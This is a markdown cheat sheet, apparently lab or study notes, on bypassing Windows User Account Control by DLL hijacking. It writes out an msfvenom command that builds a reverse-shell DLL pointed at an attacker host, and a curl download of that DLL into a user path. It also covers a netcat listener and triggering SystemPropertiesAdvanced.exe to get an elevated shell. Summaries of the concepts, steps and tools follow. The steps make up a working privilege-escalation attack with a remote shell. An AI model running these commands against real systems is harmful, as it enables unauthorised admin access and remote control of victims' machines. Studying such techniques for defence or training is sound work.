# User Account Control

## UAC & User Enumeration

```powershell
whoami /user
net localgroup administrators
whoami /priv
```

## Check UAC Settings

```powershell
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

## OS / Environment Enumeration

```powershell
[environment]::OSVersion.Version
cmd /c echo %PATH%
tasklist /svc | findstr "rundll32"
taskkill /PID <pid> /F
```

## Generate Malicious DLL (Reverse Shell)

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f dll > srrstr.dll
```

## Host & Transfer DLL

```powershell
python3 -m http.server <port>
curl http://<attacker_ip>:<port>/srrstr.dll -O "C:\\Users\\<user>\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll"
```

## Listener Setup

```powershell
nc -lvnp <attacker_port>
```

## Execute DLL (Test Execution)

```powershell
rundll32 shell32.dll,Control_RunDLL C:\\Users\\<user>\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll
```

## Trigger Auto-Elevating Binary

```powershell
C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe
```

## Verify Post-Exploitation

```powershell
whoami
whoami /priv
```

---

# **Key Concepts**

### **UAC (User Account Control)**

* Separates standard and admin tokens.
* Prompts for elevation when a process requires higher privileges.
* Not a security boundary (Microsoft’s own definition).

### **UAC Bypass**

* Achieved by exploiting Windows auto-elevating binaries.
* Relies heavily on:

  * Path issues
  * DLL hijacking
  * COM interface misconfigurations

### **DLL Hijacking**

* Place a malicious DLL in a directory within the search path of an auto-elevated binary.
* Binary loads the attacker DLL with **high integrity**, bypassing consent prompts.
* `SystemPropertiesAdvanced.exe` is a known auto-elevating candidate.

---

# **Approach, Commands, Tools, Techniques**

## 1. **Enumerate UAC State & User Privileges**

* Identify user SID, admin membership, token privileges.
* Extract UAC settings from the registry.
* Confirm Windows version (UAC bypasses are version-specific).

## 2. **Prepare DLL Payload**

* Build a reverse shell DLL using msfvenom.
* Host over Python HTTP server.
* Transfer using `curl`.

## 3. **Set Up Listener**

* Listen for incoming reverse shell using Netcat.

## 4. **Exploit DLL Hijacking**

* Execute the DLL manually via `rundll32` to verify it works.
* Launch the auto-elevating binary (`SystemPropertiesAdvanced.exe`):

  * Auto-elevation occurs without prompt.
  * The binary loads the malicious DLL from the attacker-controlled directory.
  * A high-integrity reverse shell is created.

## 5. **Verify Elevation**

* Use `whoami` and `whoami /priv` to confirm high-integrity SYSTEM/Administrator privileges.

---

# **Commands**

* `whoami`, `whoami /priv`, `net localgroup administrators`
* `REG QUERY`
* `tasklist`, `taskkill`
* `msfvenom`
* `python3 -m http.server`
* `curl`
* `nc`
* `rundll32`

---

# **Tools**

* **msfvenom** - DLL payload generation
* **nc (Netcat)** - reverse shell listener
* **[UACME](https://github.com/hfiref0x/UACME)**

---

# **Techniques**

* UAC bypass via auto-elevating binaries
* DLL hijacking
* Abuse of DLL search order
* Reverse shell injection
